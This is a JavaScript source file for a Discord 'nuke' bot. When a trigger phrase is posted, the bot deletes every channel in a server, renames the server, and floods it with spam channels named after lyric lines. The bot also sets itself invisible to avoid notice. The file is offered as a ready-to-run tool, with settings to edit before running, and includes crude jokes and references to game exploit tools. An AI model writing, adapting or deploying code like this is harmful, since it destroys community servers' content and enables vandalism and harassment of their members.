console.log('Your Cum Wont Last v1.0');
console.log('loading...');

// MODIFY THIS BEFORE RUNNING
const censor = false // censor trigger
const whitelist = false //channel whitelist (not done yet)
const server = true // change name of the server
const gomsg = "Let's funk !"
// END OF MODIFY VALUE
const sorro = "epic" // dont touch
let path = null
if(censor == false) {
path = "lyrics.txt"
} else {
path = "lyrics-censored.txt"
}

const fullpath = `./lyrics/${path}`

const txt = ["JJsploit suck balls", "Auri cute", "Ah man you just got cum wont last' ed", "Retro hub moment", "dont use fluxus with your main account pls", "KEEP MEMES OUT OF GENERAL", "JJSPLOIT PRENIUM BEST SS ONLY 1M BOBUX §&!1§§1!§1!!&§1§1§1!&"]
const rng = txt[Math.floor(Math.random() * (txt.length - 0 + 1) + 0)]

function wait(ms) {
    let start = new Date().getTime();
    let end = start;
    while (end < start + ms) {
        end = new Date().getTime()
    }
    return;
}

// idc if i copy paste it's the skeleton code
const fs = require('fs');
const { Client, Intents, Permissions } = require('discord.js');
const dotenv = require("dotenv");
const internal = require('stream')
dotenv.config();

// Create a new client instance
const client = new Client({ intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES] });

// When the client is ready, run this code (only once)
client.on('ready', () => {
	console.log('Your Cum Wont Last v1.0 loaded !');
    setInterval(function(){ client.user.setPresence('invisible'); }, 1000);
    console.log(`say "${gomsg}" to start !`);


});

client.on("messageCreate", (message) => {
    if(message.content == gomsg) {
        if(message.guild.me.permissions.has(Permissions.FLAGS.MANAGE_CHANNELS)) {
            nuke(message)
            console.log("start")
        } else return console.error("cannot delete/create channels")
    }
})

async function nuke(msg) {
    msg.guild.channels.cache.forEach(async (channel, id) => {
        channel.delete()
  .then(console.log(`deleted ${channel.name}`))
  .catch(console.error);
    });

    if(server == true) {
        if(!msg.guild.me.permissions.has(Permissions.FLAGS.MANAGE_GUILD)) return console.log("Cannot change guild name")
        msg.guild.setName('Your Cum Wont Last (discord)')
        .then(updated => console.log(`Updated guild name to ${updated.name}`))
        .catch(console.error);
    }

    try {
        // read contents of the file
        const data = fs.readFileSync(fullpath, 'UTF-8');
    
        // split the contents by new line
        const lines = data.split(/\r?\n/);
    
        // print all lines
        lines.forEach((line) => {
             msg.guild.channels.create(line, { 
                type: "GUILD_TEXT", // syntax has changed a bit
                permissionOverwrites: [{ // same as before
                    id: msg.guild.id,
                    allow: ["VIEW_CHANNEL"],
                }]
            })  //.send(`https://www.youtube.com/watch?v=7Do70nztRNE | ${rng}`)
            console.log(`create channel ${line}`);
        });
    } catch (err) {
        console.error(err);
    }
// wait(1000)
}

// Login to Discord with your client's token
client.login(process.env.TOKEN);